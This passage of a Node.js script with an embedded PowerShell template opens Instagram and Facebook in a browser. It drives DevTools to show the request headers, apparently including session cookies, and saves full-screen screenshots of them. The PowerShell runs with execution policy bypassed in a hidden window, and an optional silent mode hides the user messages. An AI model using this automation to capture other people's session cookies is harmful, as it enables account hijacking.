            # Fully visible?
            if (
                $rect.Top -ge $screen.Top -and
                $rect.Bottom -le $screen.Bottom
            ) {

                Log 'REQUEST-HEADERS-VISIBLE'

                return $true

            }

            # ------------------------------------------------
            # UI Automation ScrollItemPattern
            # ------------------------------------------------

            try {

                $scroll =
                    $req.GetCurrentPattern(
                        [System.Windows.Automation.ScrollItemPattern]::Pattern
                    )

                $scroll.ScrollIntoView()

                Start-Sleep -Milliseconds 400

                continue

            } catch {}

            # ------------------------------------------------
            # Mouse + wheel fallback
            # ------------------------------------------------

            if (
                $rect.Top -gt
                $screen.Bottom
            ) {

                [BrowserMouse]::Click(
                    [int]($rect.X + ($rect.Width / 2)),
                    [int]($rect.Y + ($rect.Height / 2))
                )

                Start-Sleep -Milliseconds 200

                [System.Windows.Forms.SendKeys]::SendWait(
                    '{PGDN}'
                )

            } else {

                [System.Windows.Forms.SendKeys]::SendWait(
                    '{PGUP}'
                )

            }

            Start-Sleep -Milliseconds 400

        } catch {

            break

        }

        $WindowEl =
            Get-WindowElementByHwnd $devHwnd

    }

    return $true
}

if ($requestExpanded) {

    Start-Sleep -Milliseconds 500

    $devEl =
        Get-WindowElementByHwnd $devHwnd

    if ($devEl) {

        Scroll-RequestHeadersIntoView $devEl | Out-Null

    }

}

# ============================================================
# FINAL DEVTOOLS FOCUS
# ============================================================

try {

    [BrowserWinApi]::SetForegroundWindow(
        $devHwnd
    ) | Out-Null

} catch {}

Start-Sleep -Milliseconds 300

Maximize-Window $devHwnd

Start-Sleep -Milliseconds 800

Log 'UI-READY'

# ============================================================
# FINAL SCREENSHOT
# ============================================================

if ($shotPath) {

    try {

        $screen =
            [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

        $bitmap =
            New-Object System.Drawing.Bitmap(
                $screen.Width,
                $screen.Height
            )

        $graphics =
            [System.Drawing.Graphics]::FromImage(
                $bitmap
            )

        try {

            $graphics.CopyFromScreen(
                $screen.Location,
                [System.Drawing.Point]::Empty,
                $screen.Size
            )

            $bitmap.Save(
                $shotPath,
                [System.Drawing.Imaging.ImageFormat]::Png
            )

        }
        finally {

            $graphics.Dispose()
            $bitmap.Dispose()

        }

        Log "SCREENSHOT-SAVED=$shotPath"

    } catch {

        Log "SCREENSHOT-ERROR=$($_.Exception.Message)"

    }

}

# ============================================================
# SIGNAL COMPLETION
# ============================================================

try {

    Set-Content `
        -LiteralPath '${doneFile.replace(/'/g, "''")}' `
        -Value 'done' `
        -Encoding ASCII

} catch {}

Log 'DONE'

exit 0

`;
}

// ============================================================
// START AUTOMATION
// ============================================================

function openBrowserWithConsole(
  forceName,
  site,
  shotPath
) {

  let name = null;
  let exe = null;

  if (IS_WIN) {

    name =
      forceName ||
      getDefaultBrowserName();

    exe =
      name
        ? getBrowserExe(name)
        : null;

  } else if (IS_MAC) {

    name =
      forceName ||
      getDefaultBrowserNameMac();

    exe =
      name
        ? getBrowserExeMac(name)
        : null;

  } else {

    name =
      forceName ||
      getDefaultBrowserNameLinux();

    exe =
      name
        ? getBrowserExeLinux(name)
        : null;

  }

  if (!name) {

    console.error(
      'Could not determine browser.'
    );

    return null;

  }

  launchBrowser(
    name,
    exe,
    site
  );

  // Give the browser a moment to start.
  setTimeout(() => {

    if (IS_WIN) {

      const script =
        browserShowScriptFor(
          name,
          site.rowTail,
          shotPath
        );

      const ps1 =
        path.join(
          os.tmpdir(),
          `cookies_show_${Date.now()}.ps1`
        );

      fs.writeFileSync(
        ps1,
        '\ufeff' + script,
        'utf8'
      );

      const child =
        spawn(
          'powershell.exe',
          [
            '-NoProfile',
            '-ExecutionPolicy',
            'Bypass',
            '-File',
            ps1
          ],
          {
            windowsHide: true
          }
        );

      child.on(
        'error',
        () => {}
      );

      child.unref();

      // Delete the temporary PowerShell file later.
      setTimeout(
        () => {
          try {
            fs.unlinkSync(ps1);
          } catch {}
        },
        120000
      );

    } else {

      // Linux/Mac retain the browser launch,
      // but the detailed Windows DevTools automation
      // above is only used on Windows.

      if (IS_MAC) {

        runDetached(
          'osascript',
          [
            '-e',
            `tell application "${MAC_PROCESS[name] || name}" to activate`
          ]
        );

      }

    }

  }, 800);

  return name;
}

// ============================================================
// BROWSER FLAG
// ============================================================

function parseBrowserFlag() {

  const known = {

    '--chrome': 'chrome',
    '--google-chrome': 'chrome',

    '--firefox': 'firefox',
    '--ff': 'firefox',

    '--brave': 'brave',

    '--edge': 'msedge',
    '--msedge': 'msedge',

    '--opera': 'opera'

  };

  for (
    const arg of process.argv.slice(2)
  ) {

    if (known[arg]) {

      return known[arg];

    }

  }

  return null;
}

// ============================================================
// MAIN
// ============================================================

async function main() {

  const forceName =
    parseBrowserFlag();

  const SITE_ORDER = [
    SITES.instagram,
    SITES.facebook
  ];

  const results = [];

  for (
    const site of SITE_ORDER
  ) {

    // Remove previous completion flag.
    if (
      fs.existsSync(doneFile)
    ) {

      try {
        fs.unlinkSync(doneFile);
      } catch {}

    }

    const username =
      getSiteUsername(site);

    const outPath =
      path.join(
        screenshots,
        `${username}_insta.png`
      );

    if (
      fs.existsSync(outPath)
    ) {

      try {
        fs.unlinkSync(outPath);
      } catch {}

    }

    console.log(
      `Starting ${username}...`
    );

    const browserName =
      openBrowserWithConsole(
        forceName,
        site,
        outPath
      );

    if (!browserName) {

      results.push({
        username,
        outPath,
        ok: false
      });

      continue;

    }

    // ========================================================
    // WAIT FOR SCREENSHOT
    //
    // Maximum 60 seconds.
    // We also stop immediately when done.flag appears.
    // ========================================================

    let waited = 0;

    while (
      !fs.existsSync(outPath) &&
      !fs.existsSync(doneFile) &&
      waited < 60
    ) {

      await sleep(300);

      waited += 0.3;

    }

    const ok =
      fs.existsSync(outPath);

    console.log(
      `${username}: screenshot=${ok}`
    );

    if (
      fs.existsSync(doneFile)
    ) {

      try {
        fs.unlinkSync(doneFile);
      } catch {}

    }

    results.push({
      username,
      outPath,
      ok
    });

    // ========================================================
    // CLOSE BROWSER
    //
    // IMPORTANT:
    // This has a hard timeout so the Node script cannot
    // appear frozen after screenshots have already been saved.
    // ========================================================

    await closeBrowser(
      browserName
    );

    await sleep(500);

  }

  // ==========================================================
  // RESULTS
  // ==========================================================

  const saved =
    results.filter(
      r => r.ok
    );

  const silent =
    process.env.COOKIES_SILENT === '1';

  if (saved.length > 0) {

    if (!silent) {

      await showMessage(
        `Screenshot${
          saved.length > 1
            ? 's'
            : ''
        } saved:\\n` +
        saved
          .map(r => r.outPath)
          .join('\\n'),
        'Instagram/Facebook Screenshot'
      );

      openCaptures();

    }

  } else {

    if (!silent) {

      await showMessage(
        'Screenshots could not be captured.',
        'Instagram/Facebook Screenshot'
      );

    }

  }

}

main().catch(
  err => {
    console.error(err);
    process.exitCode = 1;
  }
);